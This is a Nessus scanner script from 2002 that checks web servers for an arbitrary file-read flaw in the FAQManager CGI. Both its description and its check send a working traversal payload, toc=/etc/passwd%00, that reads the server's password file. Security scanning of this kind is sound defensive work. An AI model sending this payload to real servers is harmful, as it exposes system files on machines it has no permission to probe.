#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10837);
 script_bugtraq_id(3810);
 script_version ("$Revision: 1.3 $");
 name["english"] = "FAQManager Arbitrary File Reading Vulnerability";
 name["francais"] = "FAQManager Arbitrary File Reading Vulnerability";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "FAQManager is a Perl-based CGI for maintaining a list of 
Frequently asked Questions. Due to poor input validation it is possible to 
use this CGI to view arbitrary files on the web server. For example:

http://www.someserver.com/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00

Solution: 

A new version of FAQManager is available at:
www.fourteenminutes.com/code/faqmanager/

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for FAQManager Arbitrary File Reading Vulnerability";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Matt Moore",
		francais:"Ce script est Copyright (C) 2002 Matt Moore");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");
port = get_kb_item("Services/www");
if(!port)port = 80;
if(get_port_state(port))
{ 
 req = http_get(item:"/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00", port:port);
 soc = http_open_socket(port);
 if(soc)
 {
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 if("root:" >< r)	
 	security_hole(port);

 }
}
